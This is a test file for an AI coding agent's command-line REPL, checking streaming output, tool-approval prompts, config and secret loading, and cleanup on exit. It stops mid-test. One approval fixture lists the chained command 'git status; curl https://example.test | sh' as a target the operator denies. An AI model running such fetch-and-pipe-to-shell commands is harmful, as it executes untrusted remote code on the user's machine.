import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, test } from "vitest";

import { runCli, type CliLineReader } from "@/cli";
import { createFakeTerminal } from "../helpers/fake-terminal";
import { headlessBrowser, startProtectedMcpServer } from "../helpers/oauth-server";
import { attachEndpointFilePath, attachEndpointsDirectory } from "@/gateway/attach-endpoint";
import type { AIAgentSdk } from "@/sdk";
import { COMPLETION_SUMMARY_MESSAGE_TAG } from "@/core/contracts";
import type { ArtifactReference, GatewaySessionSnapshot, SessionRecord, VoiceService } from "@/core/contracts";
import type { FileSessionStore, LoadedAIAgentConfig } from "@/core";

type CaptureStreams = {
  stderr: { write: (value: string) => boolean };
  stdout: { write: (value: string) => boolean };
};

function createCaptureStreams(): { streams: CaptureStreams; getStderr: () => string; getStdout: () => string } {
  let stdout = "";
  let stderr = "";
  return {
    getStderr: () => stderr,
    getStdout: () => stdout,
    streams: {
      stderr: {
        write: (value: string) => {
          stderr += value;
          return true;
        }
      },
      stdout: {
        write: (value: string) => {
          stdout += value;
          return true;
        }
      }
    }
  };
}

/**
 * Every REPL run would otherwise bind a real loopback port and publish a
 * record under `.aia/attach-endpoints/` in the repo, opening a socket per
 * test. The listener has its own coverage in `attach-endpoint.test.ts`; here
 * it is stubbed out.
 */
// Every run gets a home of its own, so no test reads or writes the developer's
// ~/.aia (the user-global config, the trust store). A run that names no
// workspace gets an empty one rather than this repository, whose
// aia.config.jsonc declares an MCP server and so needs trust before it loads.
const hermeticRoots: string[] = [];
afterEach(async () => {
  await Promise.all(hermeticRoots.splice(0).map((root) => fs.rm(root, { force: true, recursive: true })));
});

async function runCliWithStubbedEndpoint(
  argv: string[],
  streams: CaptureStreams,
  deps: Parameters<typeof runCli>[2] = {}
): Promise<number> {
  const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-hermetic-")));
  hermeticRoots.push(root);
  await fs.mkdir(path.join(root, "workspace", ".git"), { recursive: true });
  await fs.mkdir(path.join(root, "home"), { recursive: true });
  // Subcommands take their own flags, so only the REPL and --prompt runs get one.
  const namesWorkspace = argv.includes("--cwd") || (argv.length > 0 && !argv[0]!.startsWith("-"));
  return runCli(namesWorkspace ? argv : [...argv, "--cwd", path.join(root, "workspace")], streams, {
    serveAttachEndpoint: async () => null,
    userHomeDirectory: path.join(root, "home"),
    ...deps
  });
}

async function* lineSource(items: string[]): AsyncIterable<string> {
  for (const item of items) {
    yield item;
  }
}

/**
 * A terminal-shaped line reader: typed lines accumulate in a buffer, and
 * `discardBuffered` throws away whatever has not been read yet — the behaviour
 * a real TTY reader has and a lazy array iterable does not.
 */
function createBufferedTestReader(
  initial: string[] = [],
  options: { interactive?: boolean } = {}
): CliLineReader & {
  type: (line: string) => Promise<void>;
  waitForDrain: () => Promise<void>;
} {
  const queue: string[] = [...initial];
  let wake: (() => void) | null = null;
  let drains = 0;
  const notify = (): void => {
    const resume = wake;
    wake = null;
    resume?.();
  };

  return {
    discardBuffered(): void {
      queue.length = 0;
      drains += 1;
    },
    ...(options.interactive ? { interactive: true } : {}),
    async next(): Promise<string | null> {
      while (queue.length === 0) {
        await new Promise<void>((resolve) => {
          wake = resolve;
        });
      }
      return queue.shift() as string;
    },
    async type(line: string): Promise<void> {
      queue.push(line);
      notify();
      // Let the CLI consume it before the test types anything else.
      await new Promise((resolve) => setTimeout(resolve, 5));
    },
    async waitForDrain(): Promise<void> {
      const seen = drains;
      for (let attempt = 0; attempt < 200 && drains === seen; attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 5));
      }
    }
  };
}

const FAKE_COMPLETION_SUMMARY_MESSAGE_ID = "message.test.completion-summary";

function buildSnapshot(text: string, lastError?: string, completionSummary?: string): GatewaySessionSnapshot {
  return {
    snapshot: {
      messages: [
        {
          // Deliberately no `tags` key: real snapshots default it, but fakes
          // and older persisted records omit it, and the CLI must tolerate that.
          parts: [{ kind: "text", text }],
          role: "assistant"
        },
        ...(completionSummary
          ? [
              {
                id: FAKE_COMPLETION_SUMMARY_MESSAGE_ID,
                parts: [{ kind: "text", text: completionSummary }],
                role: "assistant",
                tags: [COMPLETION_SUMMARY_MESSAGE_TAG]
              }
            ]
          : [])
      ],
      session: {
        lastError: lastError ? { message: lastError } : undefined,
        status: "completed"
      }
    },
    taskState: null
  } as unknown as GatewaySessionSnapshot;
}

type PendingApprovalSpec = {
  evaluatedTargets?: Array<{ kind: string; label: string; value: string }>;
  justification?: string;
  kind?: string;
  label: string;
  options?: Array<{ description?: string; label: string }>;
  requestId: string;
  value: string;
};

type ToolEventSpec = { errorMessage?: string; status: string; toolName: string };

type ResolvedApprovalSpec = { comment?: string; decision: string; requestId: string };

function createFakeSdk(
  options: {
    compactResult?: { hiddenMessageCount: number; summaryPath?: string };
    compactError?: string;
    completionReason?: string;
    createError?: string;
    completionSummary?: string;
    lastError?: string;
    // A log.emitted warning the gateway sends when the provider answers with
    // another model.
    modelMismatchMessage?: string;
    modelStatus?: string;
    pendingApprovals?: PendingApprovalSpec[];
    reasoning?: string;
    // resolveApproval rejects with this, as the gateway does for a request
    // already resolved elsewhere.
    resolveError?: string;
    // resolveApproval publishes approval.resolved, as the gateway does.
    emitResolutions?: boolean;
    // The run only ends once the CLI cancels it (and, with cancelEndsRun
    // false, not even then), like a model that keeps generating.
    runBlocksUntilCancel?: boolean;
    cancelEndsRun?: boolean;
    suppressStream?: boolean;
    toolEvent?: ToolEventSpec;
  } = {}
): {
  sdk: AIAgentSdk;
  emit: (event: unknown) => void;
  finishRun: () => void;
  getAttachEndpoint: () => string | undefined;
  getCancelCalls: () => number;
  getCompactCalls: () => number;
  getCreateCalls: () => number;
  getResolved: () => ResolvedApprovalSpec[];
  getResumeCalls: () => number;
  getSent: () => string[];
  wasClosed: () => boolean;
} {
  const sent: string[] = [];
  let cancelCalls = 0;
  let createCalls = 0;
  let resumeCalls = 0;
  let endRun: (() => void) | null = null;
  const resolved: ResolvedApprovalSpec[] = [];
  let pending = [...(options.pendingApprovals ?? [])];
  let closed = false;
  let compactCalls = 0;
  let attachEndpointUrl: string | undefined;
  let listener: ((event: unknown) => void) | null = null;

  const emit = (delta: string): void => {
    listener?.({ payload: { delta, sessionId: "session.test.cli.1", turnId: "turn.1" }, topic: "message.delta" });
  };

  const handle = {
    async cancel() {
      cancelCalls += 1;
      if (options.cancelEndsRun !== false) {
        endRun?.();
      }
      return { id: "run.test.cli.1", status: "running" };
    },
    async compact() {
      compactCalls += 1;
      if (options.compactError) {
        throw new Error(options.compactError);
      }
      return {
        hiddenMessageCount: options.compactResult?.hiddenMessageCount ?? 0,
        session: { id: "session.test.cli.1" },
        summary: "# Session Summary",
        summaryPath: options.compactResult?.summaryPath
      };
    },
    async listPendingApprovals() {
      return pending.map((entry) => ({
        request: {
          id: entry.requestId,
          justification: entry.justification ?? `The tool "${entry.value}" requires approval.`,
          metadata: {
            ...(entry.options ? { options: entry.options } : {}),
            ...(entry.evaluatedTargets ? { evaluatedTargets: entry.evaluatedTargets } : {})
          },
          target: { kind: entry.kind ?? "tool", label: entry.label, value: entry.value }
        }
      }));
    },
    async resolveApproval(input: { comment?: string; decision: string; requestId: string }) {
      if (options.resolveError) {
        throw new Error(options.resolveError);
      }
      resolved.push({
        ...(input.comment !== undefined ? { comment: input.comment } : {}),
        decision: input.decision,
        requestId: input.requestId
      });
      pending = pending.filter((entry) => entry.requestId !== input.requestId);
      if (options.emitResolutions) {
        listener?.({
          payload: {
            actor: "cli",
            decidedAt: new Date().toISOString(),
            decision: input.decision,
            id: `resolution.${input.requestId}`,
            metadata: {},
            requestId: input.requestId
          },
          topic: "approval.resolved"
        });
      }
      return { approval: { request: { id: input.requestId } } };
    },
    async resume() {
      resumeCalls += 1;
      return { async wait() {} };
    },
    async sendMessage(input: { text: string }) {
      sent.push(input.text);
      if (options.modelMismatchMessage) {
        listener?.({
          metadata: { code: "model_mismatch", sessionId: "session.test.cli.1" },
          payload: { level: "warn", message: options.modelMismatchMessage },
          topic: "log.emitted"
        });
      }
      if (options.reasoning) {
        listener?.({
          payload: { delta: options.reasoning, sessionId: "session.test.cli.1", turnId: "turn.1" },
          topic: "message.reasoning"
        });
      }
      if (options.toolEvent) {
        listener?.({
          payload: {
            error: options.toolEvent.errorMessage ? { message: options.toolEvent.errorMessage } : undefined,
            status: options.toolEvent.status,
            toolName: options.toolEvent.toolName
          },
          topic: "tool.updated"
        });
      }
      if (!options.suppressStream) {
        emit("echo: ");
        emit(input.text);
      }
      return {
        async wait() {
          if (options.runBlocksUntilCancel) {
            await new Promise<void>((resolve) => {
              endRun = resolve;
            });
            return { completionReason: "session_cancelled", messageIds: [] };
          }
          // Like the real gateway, the run record lists the messages the run wrote.
          return {
            ...(options.completionReason ? { completionReason: options.completionReason } : {}),
            messageIds: options.completionSummary ? [FAKE_COMPLETION_SUMMARY_MESSAGE_ID] : []
          };
        }
      };
    },
    async snapshot() {
      return buildSnapshot(`echo: ${sent[sent.length - 1] ?? ""}`, options.lastError, options.completionSummary);
    },
    subscribe(handler: (event: unknown) => void) {
      listener = handler;
      return () => {
        if (listener === handler) {
          listener = null;
        }
      };
    }
  };

  const sdk = {
    async close() {
      closed = true;
    },
    controlPlane: {
      setAttachEndpoint(url: string | undefined) {
        attachEndpointUrl = url;
      }
    },
    async request(topic: string) {
      if (topic === "model.health") {
        return {
          checkedAt: "2026-06-10T12:00:00.000Z",
          details: {},
          providerId: "fake",
          status: options.modelStatus ?? "healthy"
        };
      }
      throw new Error(`unexpected request topic ${topic}`);
    },
    sessions: {
      async create() {
        createCalls += 1;
        if (options.createError) {
          throw new Error(options.createError);
        }
        return {
          handle,
          session: { id: "session.test.cli.1" }
        };
      }
    }
  } as unknown as AIAgentSdk;

  return {
    emit: (event: unknown) => listener?.(event),
    finishRun: () => endRun?.(),
    getAttachEndpoint: () => attachEndpointUrl,
    getCancelCalls: () => cancelCalls,
    getCompactCalls: () => compactCalls,
    getCreateCalls: () => createCalls,
    getResolved: () => resolved,
    getResumeCalls: () => resumeCalls,
    getSent: () => sent,
    sdk,
    wasClosed: () => closed
  };
}

function createInterruptSource(): {
  fire: () => void;
  source: NonNullable<Parameters<typeof runCli>[2]>["interrupts"];
} {
  let listener: (() => void) | undefined;
  return {
    fire: () => {
      listener?.();
    },
    source: {
      subscribe(next: () => void) {
        listener = next;
        return () => {
          if (listener === next) {
            listener = undefined;
          }
        };
      }
    }
  };
}

function createGate(): { open: () => void; wait: Promise<void> } {
  let open!: () => void;
  const wait = new Promise<void>((resolve) => {
    open = resolve;
  });
  return { open, wait };
}

async function waitUntil(predicate: () => boolean, timeoutMs = 2_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!predicate()) {
    if (Date.now() > deadline) {
      throw new Error("Timed out waiting for the CLI.");
    }
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
}

async function waitUntilAsync(predicate: () => Promise<boolean>, timeoutMs = 2_000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!(await predicate())) {
    if (Date.now() > deadline) {
      throw new Error("Timed out waiting for the CLI.");
    }
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
}

describe("interactive CLI loop", () => {
  test("stays open until /exit, sends messages, and prints assistant output", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hello there", "/exit", "ignored after exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Session: session.test.cli.1");
    expect(capture.getStdout()).toContain("echo: hello there");
    expect(capture.getStdout()).toContain("Goodbye.");
    // Bare `aia` must enter the REPL, never the old bootstrap-info dead-end.
    expect(capture.getStdout()).not.toContain("bootstrap is in place");
    expect(fake.getSent()).toEqual(["hello there"]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("says something when a turn completes cleanly but with no tagged summary", async () => {
    // A run can reach completionReason "session_completed" without ever
    // persisting a message tagged as the attempt_complete summary (an empty
    // summary argument, or a completion path that never tags one). Before the
    // fix, formatTurnStopNotice unconditionally suppressed its notice for
    // "session_completed", so with no streamed text and no summary the
    // operator saw nothing at all after "Thinking...".
    const fake = createFakeSdk({ completionReason: "session_completed", suppressStream: true });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hello there", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).not.toContain("echo: hello there");
    expect(capture.getStderr()).toContain("Turn ended:");
  });

  test("exits cleanly when the input stream ends with no /exit (EOF)", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource([])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("AIAgent interactive session.");
    expect(fake.getSent()).toEqual([]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("exits with a clean error when the chat model is unavailable", async () => {
    const fake = createFakeSdk({ modelStatus: "unavailable" });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hello"])
    });

    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("the chat model provider");
    expect(capture.getStderr()).toContain("unavailable");
    // The REPL must not open or send anything when the model is down.
    expect(capture.getStdout()).not.toContain("AIAgent interactive session.");
    expect(fake.getSent()).toEqual([]);
    expect(fake.wasClosed()).toBe(true);
  });

  test("prints a clean startup error (not a raw stack) when boot fails", async () => {
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => {
        throw new Error("runtime boot exploded");
      },
      interactiveInput: lineSource(["hello"])
    });

    expect(exitCode).toBe(1);
    expect(capture.getStderr()).toContain("Failed to start AIAgent: runtime boot exploded");
  });

  // `aia info` used to print a hardcoded placeholder ("bootstrap is in
  // place", fixed surface and provider lists) whatever the config said.
  test("`aia info` describes the config in effect without starting a session or running a secret", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-info-"));
    try {
      const home = path.join(root, "home");
      const workspace = path.join(root, "workspace");
      const marker = path.join(root, "secret-provider-ran");
      await fs.mkdir(path.join(home, ".aia"), { recursive: true });
      await fs.mkdir(workspace, { recursive: true });
      await fs.writeFile(
        path.join(home, ".aia", "config.jsonc"),
        JSON.stringify({
          configVersion: 1,
          gateway: { auth: { token: { id: "value", provider: "marker", source: "exec" } } },
          secrets: {
            providers: {
              marker: { args: ["-c", `echo ran > '${marker}'; echo token`], command: "/bin/sh", source: "exec" }
            }
          }
        }),
        "utf8"
      );
      await fs.writeFile(
        path.join(workspace, "aia.config.jsonc"),
        JSON.stringify({
          configVersion: 1,
          providers: { lmStudio: { model: "workspace-chosen-model" } },
          runtime: { defaultModel: "runtime-default-model" }
        }),
        "utf8"
      );
      const capture = createCaptureStreams();
      let sdkCreated = false;

      const exitCode = await runCliWithStubbedEndpoint(["info", "--cwd", workspace], capture.streams, {
        createSdk: async () => {
          sdkCreated = true;
          throw new Error("info must not create a session");
        },
        userHomeDirectory: home
      });

      expect(exitCode).toBe(0);
      expect(sdkCreated).toBe(false);
      const stdout = capture.getStdout();
      expect(stdout).toMatch(/^aia \d+\.\d+\.\d+/u);
      expect(stdout).toContain(`Workspace config:   ${path.join(workspace, "aia.config.jsonc")}`);
      expect(stdout).toContain(`User-global config: ${path.join(home, ".aia", "config.jsonc")}`);
      // The provider's own model is what a turn asks for, not runtime.defaultModel.
      expect(stdout).toContain("Chat model:         workspace-chosen-model (lm_studio at ");
      expect(stdout).toContain("Config trust:       not needed");
      expect(stdout).not.toContain("bootstrap is in place");
      // Describing the config must not run a secret provider to do it.
      await expect(fs.access(marker)).rejects.toThrow();
    } finally {
      await fs.rm(root, { force: true, recursive: true });
    }
  });

  test("says when the provider answered with another model than the one requested", async () => {
    const fake = createFakeSdk({
      modelMismatchMessage: 'The provider answered with model "loaded-model", not the requested "configured-model".'
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hi there", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStderr()).toContain('· The provider answered with model "loaded-model"');
    // Followed by where the requested id came from.
    expect(capture.getStderr()).toContain("Chat model requested:");
  });

  // A model that writes its answer and passes the same words to
  // attempt_complete had the answer printed twice.
  test("prints the completion summary only when it adds to what streamed", async () => {
    const fake = createFakeSdk({ completionReason: "session_completed", completionSummary: "echo: hi there" });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hi there", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout().match(/echo: hi there/gu)).toHaveLength(1);
  });

  test("shows a thinking indicator and streams the response", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["hi there", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Thinking…");
    expect(capture.getStdout()).toContain("echo: hi there");
  });

  test("streams the model's reasoning under the thinking section", async () => {
    const fake = createFakeSdk({ reasoning: "Plan: mkdir ~/temp then write index.html." });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["make a site", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Thinking…");
    expect(capture.getStdout()).toContain("Plan: mkdir ~/temp then write index.html.");
    expect(capture.getStdout()).toContain("echo: make a site");
  });

  test("does not reprint a prior message on a tool-only turn (no deltas)", async () => {
    // snapshot would return "echo: …" as the latest assistant text; with the
    // stale-summary fallback removed, a no-delta turn must not reprint it.
    const fake = createFakeSdk({
      suppressStream: true,
      toolEvent: { status: "succeeded", toolName: "write_file" }
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["write a file", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStderr()).toContain("· write_file: succeeded");
    expect(capture.getStdout()).not.toContain("echo:");
  });

  test("surfaces the reason a tool failed", async () => {
    const fake = createFakeSdk({
      toolEvent: { errorMessage: "ENOENT: no such directory", status: "failed", toolName: "shell_command" }
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["run a command", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStderr()).toContain("· shell_command: failed — ENOENT: no such directory");
  });

  test("prompts inline for approval and resolves it when the operator approves", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [
        { justification: "Ask before file writes.", label: "Write File", requestId: "approval.1", value: "write_file" }
      ]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["write the file", "y", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).toContain("Approve Write File → write_file? [y/N/a/e]");
    // The request's justification is shown so the operator knows why it is asked.
    expect(capture.getStdout()).toContain("Ask before file writes.");
    expect(capture.getStdout()).toContain("Approved write_file.");
    expect(fake.getResolved()).toEqual([{ decision: "approved", requestId: "approval.1" }]);
    expect(fake.getSent()).toEqual(["write the file"]);
  });

  test("denies an approval outright without prompting for an explanation", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [{ label: "Run Command", requestId: "approval.2", value: "shell_command" }]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      // "n" denies and consumes no further input; explaining is opt-in via "e".
      interactiveInput: lineSource(["run it", "n", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(capture.getStdout()).not.toContain("What should the agent do instead?");
    expect(capture.getStdout()).toContain("Denied shell_command.");
    expect(fake.getResolved()).toEqual([{ decision: "denied", requestId: "approval.2" }]);
    expect(capture.getStdout()).toContain("Goodbye.");
  });

  test("`e` denies and sends the explanation as the resolution comment so it becomes steering", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [{ label: "Run Command", requestId: "approval.3", value: "shell_command" }]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["run it", "e", "use ls instead of find", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(fake.getResolved()).toEqual([
      { comment: "use ls instead of find", decision: "denied", requestId: "approval.3" }
    ]);
    expect(capture.getStdout()).toContain("What should the agent do instead?");
    expect(capture.getStdout()).toContain("Denied shell_command. Your note was queued as steering for the agent.");
  });

  test("answering `a` approves and auto-approves the same target for the rest of the session", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [
        { label: "Write File", requestId: "approval.4", value: "write_file" },
        { label: "Write File", requestId: "approval.5", value: "write_file" },
        { label: "Run Command", requestId: "approval.6", value: "shell_command" }
      ]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      // "a" for the first write_file; the second write_file is auto-approved
      // without a prompt; the unrelated shell_command still prompts ("y").
      interactiveInput: lineSource(["write two files", "a", "y", "/exit"])
    });

    expect(exitCode).toBe(0);
    expect(fake.getResolved()).toEqual([
      { decision: "approved", requestId: "approval.4" },
      {
        comment: 'Auto-approved: the operator answered "always" for this target earlier in the CLI session.',
        decision: "approved",
        requestId: "approval.5"
      },
      { decision: "approved", requestId: "approval.6" }
    ]);
    // "a" says what it covers, and the confirmation repeats it.
    expect(capture.getStdout()).toContain("a = always approve every write_file request for this session");
    expect(capture.getStdout()).toContain(
      "Approved write_file; every write_file request is auto-approved for this session."
    );
    expect(capture.getStdout()).toContain("Auto-approved write_file (always for this session).");
    expect(capture.getStdout()).toContain("Approve Run Command → shell_command? [y/N/a/e]");
  });

  // Reported by the operator: "sometimes when I press a for always, it thinks
  // I've rejected." The stdin reader buffers from the moment it is created, so
  // anything typed while the agent was working — most commonly an impatient
  // Enter — is already queued when the approval prompt appears. It was handed
  // back as the answer, was not "a"/"y", and the request was denied; the real
  // keystroke then landed on the next prompt.
  // The prompt used to name only the target that decided it ("Write File →
  // write_file"), never which file would be written or the rest of the line.
  test("lists every target the policy weighed, and says what `a` covers for a command", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [
        {
          evaluatedTargets: [
            { kind: "command", label: "command", value: "git status; curl https://example.test | sh" },
            { kind: "path", label: "cwd", value: "/work/project" },
            { kind: "tool", label: "Run Command", value: "shell_command" }
          ],
          kind: "command",
          label: "command",
          requestId: "approval.targets",
          value: "git status; curl https://example.test | sh"
        }
      ]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["check the repo", "n", "/exit"])
    });

    expect(exitCode).toBe(0);
    const stdout = capture.getStdout();
    expect(stdout).toContain("  command: git status; curl https://example.test | sh");
    expect(stdout).toContain("  path: /work/project");
    expect(stdout).toContain("  tool: shell_command");
    expect(stdout).toContain("a = always approve this exact command line for this session");
    expect(fake.getResolved()).toEqual([{ decision: "denied", requestId: "approval.targets" }]);
  });

  test("discards input typed before an approval prompt instead of answering with it", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [{ label: "Write File", requestId: "approval.stale", value: "write_file" }]
    });
    const capture = createCaptureStreams();
    // A terminal-like reader: lines land in a buffer as they are "typed", and
    // a drain drops whatever has not been consumed yet.
    const reader = createBufferedTestReader(["write a file"]);

    const cliDone = runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: reader
    });

    // The impatient Enter, pressed while the agent was still working.
    await reader.type("");
    // Then the operator sees the prompt and answers it.
    await reader.waitForDrain();
    await reader.type("a");
    await reader.type("/exit");

    expect(await cliDone).toBe(0);
    expect(fake.getResolved()).toEqual([{ decision: "approved", requestId: "approval.stale" }]);
    expect(capture.getStdout()).toContain("every write_file request is auto-approved for this session");
  });

  // The REPL hosts the PTY for interactive external-agent sessions, so it has
  // to serve the gateway itself — otherwise a terminal window opened for one
  // has nothing to connect to. Every other test here stubs this out.
  test("serves a loopback gateway endpoint for the session and closes it on exit", async () => {
    const fake = createFakeSdk();
    const capture = createCaptureStreams();
    let closed = false;
    let servedFor: unknown = null;

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["/exit"]),
      serveAttachEndpoint: async (sdk) => {
        servedFor = sdk;
        return {
          async close() {
            closed = true;
          },
          url: "ws://127.0.0.1:54321/api/gateway/ws"
        };
      }
    });

    expect(exitCode).toBe(0);
    expect(servedFor).toBe(fake.sdk);
    // The runtime has to know the listener, or no window can reach it.
    expect(fake.getAttachEndpoint()).toBe("ws://127.0.0.1:54321/api/gateway/ws");
    // A leaked listener would keep a port bound for the life of the process.
    expect(closed).toBe(true);
  });

  // Startup used to read the config three times: for the SDK, for the
  // model-provenance hint, and for the attach listener. Every secret the config
  // references was resolved each time, so an `exec` provider such as a
  // password-manager CLI ran, and possibly prompted, three times per start.
  test("reads the config once at startup and hands that reading to the SDK", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-config-once-"));
    try {
      const home = path.join(root, "home");
      const workspace = path.join(root, "workspace");
      const runs = path.join(root, "secret-provider-runs");
      await fs.mkdir(path.join(home, ".aia"), { recursive: true });
      await fs.mkdir(workspace, { recursive: true });
      await fs.writeFile(
        path.join(home, ".aia", "config.jsonc"),
        JSON.stringify({
          configVersion: 1,
          gateway: { auth: { token: { id: "value", provider: "counter", source: "exec" } } },
          secrets: {
            providers: {
              counter: {
                args: ["-c", `echo run >> '${runs}'; echo token-from-exec`],
                command: "/bin/sh",
                source: "exec"
              }
            }
          }
        }),
        "utf8"
      );
      const fake = createFakeSdk();
      let handed: unknown;

      const exitCode = await runCliWithStubbedEndpoint(["--cwd", workspace], createCaptureStreams().streams, {
        createSdk: async ({ loaded }) => {
          handed = loaded?.resolvedConfig.gateway.auth.token;
          return fake.sdk;
        },
        interactiveInput: lineSource(["/exit"]),
        userHomeDirectory: home
      });

      expect(exitCode).toBe(0);
      expect((await fs.readFile(runs, "utf8")).trim().split("\n")).toEqual(["run"]);
      expect(handed).toBe("token-from-exec");
    } finally {
      await fs.rm(root, { force: true, recursive: true });
    }
  });

  // A readline over a terminal and a bound listener each keep the process
  // alive, and only the post-welcome path released them: `aia` printed why it
  // was stopping and then kept running.
  describe("releases what it opened on every early exit", () => {
    function closableReader(): { closed: () => boolean; reader: CliLineReader } {
      let closed = false;
      return {
        closed: () => closed,
        reader: {
          close: () => {
            closed = true;
          },
          discardBuffered: () => undefined,
          next: async () => null
        }
      };
    }

    test("when the session cannot be created after the listener is served", async () => {
      const fake = createFakeSdk({ createError: "session store unavailable" });
      const capture = createCaptureStreams();
      const input = closableReader();
      let listenerClosed = false;

      const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
        createSdk: async () => fake.sdk,
        interactiveInput: input.reader,
        serveAttachEndpoint: async () => ({
          close: async () => {
            listenerClosed = true;
          },
          url: "ws://127.0.0.1:54321/api/gateway/ws"
        })
      });

      expect(exitCode).toBe(1);
      expect(capture.getStderr()).toContain("session store unavailable");
      expect(listenerClosed).toBe(true);
      expect(input.closed()).toBe(true);
    });

    test("when the chat model is unavailable", async () => {
      const fake = createFakeSdk({ modelStatus: "unavailable" });
      const input = closableReader();

      const exitCode = await runCliWithStubbedEndpoint([], createCaptureStreams().streams, {
        createSdk: async () => fake.sdk,
        interactiveInput: input.reader
      });

      expect(exitCode).toBe(1);
      expect(input.closed()).toBe(true);
    });

    test("when the config cannot be loaded", async () => {
      const home = await fs.mkdtemp(path.join(os.tmpdir(), "aiagent-cli-bad-config-"));
      try {
        await fs.mkdir(path.join(home, ".aia"), { recursive: true });
        await fs.writeFile(path.join(home, ".aia", "config.jsonc"), '{ "configVersion": 1, "nope": true }', "utf8");
        const capture = createCaptureStreams();
        const input = closableReader();
        let sdkCreated = false;

        const exitCode = await runCliWithStubbedEndpoint(["--cwd", home], capture.streams, {
          createSdk: async () => {
            sdkCreated = true;
            throw new Error("the SDK must not be created from a config that failed to load");
          },
          interactiveInput: input.reader,
          userHomeDirectory: home
        });

        expect(exitCode).toBe(1);
        expect(capture.getStderr()).toContain("Failed to start AIAgent");
        expect(sdkCreated).toBe(false);
        expect(input.closed()).toBe(true);
      } finally {
        await fs.rm(home, { force: true, recursive: true });
      }
    });

    test("when the SDK cannot be created", async () => {
      const input = closableReader();

      const exitCode = await runCliWithStubbedEndpoint([], createCaptureStreams().streams, {
        createSdk: async () => {
          throw new Error("config exploded");
        },
        interactiveInput: input.reader
      });

      expect(exitCode).toBe(1);
      expect(input.closed()).toBe(true);
    });
  });

  test("keeps answering piped approval input in order, because a script supplies it deliberately", async () => {
    const fake = createFakeSdk({
      pendingApprovals: [{ label: "Write File", requestId: "approval.piped", value: "write_file" }]
    });
    const capture = createCaptureStreams();

    const exitCode = await runCliWithStubbedEndpoint([], capture.streams, {
      createSdk: async () => fake.sdk,
      interactiveInput: lineSource(["write a file", "y", "/exit"])
